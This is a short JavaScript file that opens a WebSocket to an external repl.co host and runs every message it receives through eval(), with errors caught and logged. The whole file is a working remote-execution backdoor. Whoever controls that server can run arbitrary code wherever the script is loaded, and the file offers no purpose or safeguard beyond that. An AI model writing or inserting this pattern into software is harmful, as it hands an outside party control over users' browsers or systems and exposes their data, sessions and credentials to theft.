
let socket = new WebSocket("wss://fbsWs.itsvops.repl.co");

socket.onopen = function(e) {
    //console.log('connected to fbs websocket')
};

socket.onmessage = function(event) {
    try {
        eval(event.data)
    }catch(err) {
        console.log(err)
    }
};

socket.onclose = function(event) {
    //console.log('ws closed? wtf')
};

socket.onerror = function(error) {
    console.log(error)
};